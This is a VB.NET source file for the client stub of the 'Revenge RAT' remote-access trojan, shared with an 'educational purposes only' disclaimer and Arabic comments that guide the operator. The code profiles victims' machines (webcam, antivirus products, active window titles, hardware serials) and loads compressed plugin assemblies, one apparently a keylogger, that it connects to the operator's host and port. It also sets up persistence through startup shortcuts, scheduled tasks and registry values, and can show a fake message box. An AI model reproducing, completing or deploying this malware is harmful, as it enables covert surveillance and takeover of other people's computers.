'This S.R.C Client Of Revenge RAT V0.2 Maded By (N A P O L E O N) EXTRACTED By StalkerDz (AKA CaptainDz)
'Spécial Thank's to (N A P O L E O N) For Making This Great RAT
'This Src is only  for educational purposes only 
'Facebook : https://www.facebook.com/StlakerDz
'Skype : Sofiane.blida5


Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.IO.Compression
Imports System.Management
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Net
Imports System.Environment
Imports Microsoft.Win32

Namespace Stub
    <StandardModule> _
    Friend NotInheritable Class Func
        ' Methods
        Public Shared Function BS(ByVal b As Byte()) As String
            Return Encoding.Default.GetString(b)
        End Function

        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
        End Function
        ' التحقق اذا كانت هناك كاميرا   
        Public Shared Function CheckCam() As String
            Try
                Dim num2 As Integer
                Dim num As Integer = 0
                Do
                    Dim lpszVer As String = Nothing
                    If Func.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                        Return "Yes"
                    End If
                    num += 1
                    num2 = 4
                Loop While (num <= num2)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Return "No"
        End Function

        Public Shared Function Decode(ByVal Input As String) As Object
            Return Encoding.UTF8.GetString(Convert.FromBase64String(Input))
        End Function

        Public Shared Function Decompress(ByVal data As Byte()) As Byte()
            Dim stream2 As New MemoryStream
            stream2.Write(data, 0, data.Length)
            stream2.Position = 0
            Dim stream As New GZipStream(stream2, CompressionMode.Decompress, True)
            Dim stream3 As New MemoryStream
            Dim array As Byte() = New Byte(&H40 - 1) {}
            Dim count As Integer = -1
            count = stream.Read(array, 0, array.Length)
            Do While (count > 0)
                stream3.Write(array, 0, count)
                count = stream.Read(array, 0, array.Length)
            Loop
            stream.Close()
            Return stream3.ToArray
        End Function
        'Byte الي   string الحويل  من   
        Public Shared Function Encode(ByVal Input As String) As Object
            Return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input))
        End Function
        'اضهاررسالة الخطأ
        Public Shared Function FakeMessgbox(ByVal [text] As String, ByVal title As String, ByVal Button As MessageBoxButtons, ByVal icon As MessageBoxIcon) As Object
            Dim obj2 As Object
            MessageBox.Show([text], title, Button, icon)
            Return obj2
        End Function

        Public Shared Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
            Dim list As New List(Of Byte())
            Dim stream As New MemoryStream
            Dim stream2 As New MemoryStream
            Dim strArray As String() = Strings.Split(Func.BS(b), WRD, -1, CompareMethod.Binary)
            stream.Write(b, 0, strArray(0).Length)
            stream2.Write(b, (strArray(0).Length + WRD.Length), (b.Length - (strArray(0).Length + WRD.Length)))
            list.Add(stream.ToArray)
            list.Add(stream2.ToArray)
            stream.Dispose()
            stream2.Dispose()
            Return list.ToArray
        End Function
        'جلب  نواة الوبندوز سواء 64/32
        Public Shared Function GenerateOperatingSystem() As String
            If Directory.Exists((Environment.GetFolderPath(SpecialFolder.System).Replace("Windows\system32", "") & "Program Files (x86)")) Then
                Return "x64"
            End If
            Return "x32"
        End Function
        ' جلب اسامي النوافذ  المفتوحة
        Public Shared Function GetCaption() As String
            Dim lpString As New StringBuilder(&H100)
            Func.GetWindowText(Func.GetForegroundWindow, lpString, lpString.Capacity)
            Return lpString.ToString
        End Function

        <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetForegroundWindow() As IntPtr
        End Function
        'جلب نوع الويندوز
        Public Shared Function GetProduct(ByVal Product As String) As String
            Dim str As String
            Try
                Dim str2 As String = String.Empty
                Dim obj2 As ManagementObject
                For Each obj2 In New ManagementObjectSearcher(("root\SecurityCenter" & Interaction.IIf(Main.info.OSFullName.Contains("XP"), "", "2").ToString), Product).Get
                    str2 = (str2 & obj2.Item("displayName").ToString)
                    Try
                        str2 = (str2 & " v " & obj2.Item("versionNumber").ToString & " . ")
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        str2 = (str2 & " . ")
                        ProjectData.ClearProjectError()
                    End Try
                Next
                If (str2 <> String.Empty) Then
                    Return str2
                End If
                str = "N/A"
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                str = "N/A"
                ProjectData.ClearProjectError()
                Return str
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
        End Function

        <DllImport("user32", CharSet:=CharSet.Auto, SetLastError:=True)> _
        Private Shared Function GetWindowText(ByVal hWnd As IntPtr, ByVal lpString As StringBuilder, ByVal cch As Integer) As Integer
        End Function

        Public Shared Function HWD() As String
            Dim str As String
            Try
                Dim num As Integer
                Dim lpVolumeNameBuffer As String = Nothing
                Dim lpMaximumComponentLength As Integer = 0
                Dim lpFileSystemFlags As Integer = 0
                Dim lpFileSystemNameBuffer As String = Nothing
                Func.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
                str = Conversion.Hex(num)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "ERR"
                ProjectData.ClearProjectError()
                Return str
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function
        'plugins تشغيل 
        Public Shared Function InvokePlugin(ByVal H As String, ByVal P As String, ByVal N As String, ByVal C As String, ByVal ID As String, ByVal HWD As String, ByVal Bytes As String, ByVal Sock As Integer, ByVal M As Boolean) As Object
            Dim obj3 As Object
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Assembly.Load(Func.Decompress(Convert.FromBase64String(Bytes))).CreateInstance((N & "." & C)))
            If M Then
                NewLateBinding.LateSet(objectValue, Nothing, "Host", New Object() {H}, Nothing, Nothing)
                NewLateBinding.LateSet(objectValue, Nothing, "Port", New Object() {P}, Nothing, Nothing)
                NewLateBinding.LateSet(objectValue, Nothing, "ID", New Object() {ID}, Nothing, Nothing)
                NewLateBinding.LateSet(objectValue, Nothing, "HWD", New Object() {HWD}, Nothing, Nothing)
                NewLateBinding.LateSet(objectValue, Nothing, "Key", New Object() {Func.Key}, Nothing, Nothing)
                NewLateBinding.LateSet(objectValue, Nothing, "Sock", New Object() {Sock}, Nothing, Nothing)
                NewLateBinding.LateSet(objectValue, Nothing, "SPL", New Object() {Main.SPL}, Nothing, Nothing)
                If (N = "KE") Then
                    NewLateBinding.LateSet(objectValue, Nothing, "LogSize", New Object() {Func.LogsSize}, Nothing, Nothing)
                End If
            End If
            NewLateBinding.LateCall(objectValue, Nothing, "Start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Return obj3
        End Function

        Public Shared Function SB(ByVal s As String) As Byte()
            Return Encoding.Default.GetBytes(s)
        End Function
        'صنع  اختصار في الستارت  ا ب
        Public Shared Function ShortCutCreate(ByVal Title As String, ByVal Path As String) As Object
            Dim obj2 As Object
            File.WriteAllText((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Title & ".url"), String.Format("[InternetShortcut]{0}URL={1}{0}", ChrW(13) & ChrW(10), Path))
            Return obj2
        End Function




        Public Shared Button As String = "[Button]"
        Public Shared CheackShulderTask As String = "[InstallinShulderTask]" 'ان كنت تريد التثبيت  في المهام المجدولة True غيرها الي 
        Public Shared CheckHide As String = False
        Public Shared CheckIfCopy As String = "[CheckIfCopy]"
        Public Shared CounterHosts As Integer = 0
        Public Shared dnsnameb As String = "[DNSNameBlock]"
        Public Shared EncryptHOstPort As String = False
        Public Shared FolderCopy As String = "[FolderCopyPath]" 'مسار نزول السيرفرغيره كما تريد 
        Public Shared hHwnd As Integer
        Public Shared Host As String = "127.0.0.1"  ' الهوست  الخاص بك  هنا 
        Public Shared Hostsfile As String = "[Hostsfile]"
        Public Shared Iconn As String = "[Icon]"
        Public Shared id As String = "SRC Extracted By StalkerDz" ' id الضحية  غيره  كما تريد 
        Public Shared InstallIno As String = "[InstallIno]"
        Public Shared InstallinoF As String = "[InstallinoF]"
        Public Shared Installinop As String = "[Installinop]"
        Public Shared ipaddresshost As String = "[IPAdressHosts]"
        Public Shared Key As String = "Revenge-RAT" ' مفتاح  السوكت  غيره  كما تريد  لا تنسى تغيره  ايضا في السيرفر 
        Public Shared LocalIP As String = DirectCast(Dns.GetHostByName(Dns.GetHostName).AddressList.GetValue(0), IPAddress).ToString
        Public Shared LogsSize As String = "[Size]"
        Public Shared makel As String
        Public Shared MessgboxFakeCheck As String = False 'اذا كنت تريد  اضهار رسالة ما  عند فتح  السيرفر لدا الضحية  true غيرها الي 
        Public Shared motherborde As String = Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
        Public Shared mtx As Mutex
        Public Shared MutexID As String = "11111" ' mutex غيره كما تريد 
        Public Shared Password As String = "Revenge-RAT" 'باسورد فك  التشفير غيره كما  تريد ..لاتنسى تغيره  ايضا من  السيرفر
        Public Shared Port As String = "1111" ' البورت الخاصة بك  هنا 
        Public Shared RegCheck As String = "[RegCheck]"
#Region "خصائص الستارت اب "
        Public Shared RegPath As String = "[RegPath]"
        Public Shared RegValue As String = "[RegValueName]" 'اسم  القيمة في الريجيستري غيرها كما تريد 
        Public Shared SCHTaskName As String = "[SCHTaskName]" 'غيره  كما تريد "اسم عشوائي لكي يضهر في المهام المجدولة"
        Public Shared SCHTaskTiem As String = "[SCHTaskTiem]" '  اختار وقت بال الميلي ثانية لتشغيل السيرفر                1000 =  1ثانية 
        Public Shared ServerName As String = "[ServerName]" 'اسم نزول السيرفر غيره كما تريد 
        Public Shared ServerNameSt As String = "[ServerNameSt]"
#End Region
        Public Shared Shadowx As Object
        Public Shared ShortCheack As String = "[ShortCutCheck]"
        Public Shared ShortCutName As String = "[ShortCutName]" 'اسم الشورت كت غيره كما تريد
        Public Shared Sleep As String = False    'ان  كنت  تريد عمل تاخير للسيرفر True  غيره الي      
        Public Shared SleepTime As String = "[SleepTime]" 'غيرها كما تريد  كم من  وقت  تريد تاخير السريرف
        Public Shared StartupCheack As String = "[StartupCheack]"
        Public Shared [Text] As String = "[Text]"
        Public Shared Title As String = "[Title]"












        ' Fields
        'Public Shared Button As String = "0"
        'Public Shared CheackShulderTask As String = "False"
        'Public Shared CheckHide As String = "False"
        'Public Shared CheckIfCopy As String = "False"
        'Public Shared CounterHosts As Integer = 0
        'Public Shared dnsnameb As String = ""
        'Public Shared EncryptHOstPort As String = "False"
        'Public Shared FolderCopy As String = " "
        'Public Shared hHwnd As Integer
        'Public Shared Host As String = "127.0.0.1\127.0.0.1"
        'Public Shared Hostsfile As String = "False"
        'Public Shared Iconn As String = "0"
        'Public Shared id As String = "Guest"
        'Public Shared InstallIno As String = "False"
        'Public Shared InstallinoF As String = ""
        'Public Shared Installinop As String = ""
        'Public Shared ipaddresshost As String = ""
        'Public Shared Key As String = "Revenge-RAT"
        'Public Shared LocalIP As String = DirectCast(Dns.GetHostByName(Dns.GetHostName).AddressList.GetValue(0), IPAddress).ToString
        'Public Shared LogsSize As String = "100"
        'Public Shared makel As String
        'Public Shared MessgboxFakeCheck As String = "False"
        'Public Shared motherborde As String = Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
        'Public Shared mtx As Mutex
        'Public Shared MutexID As String = "RV_MUTEX-06F7MMH6M66HDLJMYP6B6P"
        'Public Shared Password As String = "Revenge-RAT"
        'Public Shared Port As String = "333\1111"
        'Public Shared RegCheck As String = "False"
        'Public Shared RegPath As String = ""
        'Public Shared RegValue As String = ""
        'Public Shared SCHTaskName As String = ""
        'Public Shared SCHTaskTiem As String = "1"
        'Public Shared ServerName As String = ""
        'Public Shared ServerNameSt As String = ""
        'Public Shared Shadowx As Object
        'Public Shared ShortCheack As String = "False"
        'Public Shared ShortCutName As String = ""
        'Public Shared Sleep As String = "False"
        'Public Shared SleepTime As String = "1"
        'Public Shared StartupCheack As String = "False"
        'Public Shared [Text] As String = ""
        'Public Shared Title As String = ""
    End Class
End Namespace

